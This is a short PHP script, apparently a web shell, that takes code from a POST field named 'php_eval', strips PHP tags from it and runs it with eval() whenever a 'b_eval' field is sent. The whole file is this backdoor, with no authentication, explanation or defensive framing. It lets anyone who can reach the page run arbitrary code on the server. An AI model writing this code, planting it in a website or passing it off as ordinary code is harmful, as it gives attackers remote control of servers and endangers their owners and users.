<?php
if($_POST['b_eval']){
  $eval=str_replace("<?","",$_POST['php_eval']);
  $eval=str_replace("?>","",$eval);
  eval($eval);
}

?>